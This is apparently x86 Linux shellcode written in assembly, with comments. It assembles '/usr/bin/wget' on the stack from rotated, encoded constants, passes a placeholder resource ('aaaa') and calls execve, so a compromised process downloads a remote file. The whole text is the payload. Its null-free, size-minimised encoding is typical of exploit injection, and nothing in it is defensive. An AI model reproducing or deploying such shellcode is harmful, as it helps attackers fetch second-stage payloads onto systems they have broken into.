global _start

section .text
_start:
	push 0xffffffff
	pop eax
	neg eax
	add al, 0xa			; make it 0xb
	; int execve(const char *, char *const [], char *const [])
	cdq				; make edx zero, as well

	; make the base pointer the same as the current stack pointer, since
	; operations with pointers are one byte smaller with the former
	mov ebp, esp

	push edx			; nul character
	push 0x61616161			; fetch this resource

	push edx			; nul character
	push edx			; the stack might be full of garbage
	mov byte [ebp - 0x10], 0x74	; overwrite LSB with a t
	; no need to sub the stack pointer here, only the current double word
	; LSB was changed

	push 0xcaceee5e
	ror dword [esp], 0x1		; /wge
	push 0xdcd2c45e
	ror dword [esp], 0x1		; /bin
	push 0xe4e6ea5e
	ror dword [esp], 0x1		; /usr

	push esp
	pop ebx				; filename
	lea ecx, [ebp - 0x8]		; save a pointer to the arguments

	push edx
	mov dword [ebp - 0x24], ecx	; save the pointer to the arguments
	mov dword [ebp - 0x28], ebx	; save the pointer to the command
	lea ecx, [ebp - 0x28]		; argv

	; edx is already zero by the above cdq instruction
	int 0x80
